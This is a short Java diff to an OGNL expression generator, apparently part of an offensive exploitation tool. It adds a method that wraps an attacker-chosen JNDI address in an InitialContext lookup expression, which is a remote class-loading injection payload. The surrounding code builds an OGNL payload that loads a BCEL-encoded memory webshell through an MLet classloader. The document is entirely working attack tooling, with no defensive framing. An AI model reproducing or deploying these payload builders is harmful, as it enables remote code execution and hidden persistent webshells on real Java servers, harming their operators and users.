@@ -76,6 +76,13 @@ public class OGNLExpr implements IExpr {
         }
     }
 
+    @Override
+    public String[] genJNDI(String jndiAddress) {
+        return new String[]{
+                out("new javax.naming.InitialContext().lookup('" + escape(jndiAddress) + "')")
+        };
+    }
+
     public String getBcelMemShell(byte[] memShellClass) throws IOException {
         MemShellClassFactory classFactory = new MemShellClassFactory(memShellClass, MemShellClassFactory.BCEL);
         return "(new com.sun.org.apache.bcel.internal.util.ClassLoader(new javax.management.loading.MLet(new java.net.URL[0],@java.lang.Thread@currentThread().getContextClassLoader())).loadClass('" + classFactory.getPayload() + "').newInstance())";
